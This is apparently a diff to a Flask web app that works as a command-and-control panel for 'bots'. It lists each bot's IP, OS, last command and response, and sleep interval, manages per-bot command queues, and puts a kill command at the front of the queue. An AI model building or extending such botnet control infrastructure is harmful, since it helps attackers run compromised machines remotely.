@@ -40,16 +40,20 @@ def testcmd():
 @app.route("/api/clients/list", methods=["GET"])
 @login_required
 def api_clients_list():
-    bots = [ Bot.query.filter_by(ip=c).one() for c in g.queue.keys() ]
+    bots = Bot.query.all()
+    #bots = [ Bot.query.filter_by(ip=c).one() for c in g.queue.keys() ]
     data = {}
     for bot in bots:
         data[bot.id] = dict()
         data[bot.id]["IP"] = bot.ip
         data[bot.id]["OS"] = bot.os
         data[bot.id]["last_seen"] = bot.last_seen
+        data[bot.id]["last_command"] = bot.last_command
         data[bot.id]["last_response"] = bot.last_response
         data[bot.id]["set_interval"] = bot.sleep_interval
-        data[bot.id]['cmd_queue'] = g.queue[bot.ip]
+        if bot.ip in g.queue.keys():
+            data[bot.id]["cmd_queue"] = g.queue[bot.ip]
+        else: data[bot.id]["cmd_queue"] = []
     return json.dumps(data)
 
 @app.route("/api/clients/cmd/<int:id>", methods=["POST"])
@@ -86,7 +90,7 @@ def api_clients_kill(id):
     try:
         bot = Bot.query.filter_by(id=id).one()
     except: return "", 500
-    g.queue[bot.ip].append("killkillkill")
+    g.queue[bot.ip].insert(0, "killkillkill")
     return "", 200
 
 @app.route("/api/clients/delete/<int:id>")
@@ -103,6 +107,7 @@ def api_clients_delete(id):
 @app.route("/bots")
 @login_required
 def bots():
+    bots = Bot.query.all()
     cmd_form = RunCommand()
     int_form = SetSleepInterval()
-    return render_template("bots.html", title="Bots", cmd_form=cmd_form, int_form=int_form)
+    return render_template("bots.html", title="Bots", cmd_form=cmd_form, int_form=int_form, bots=bots)
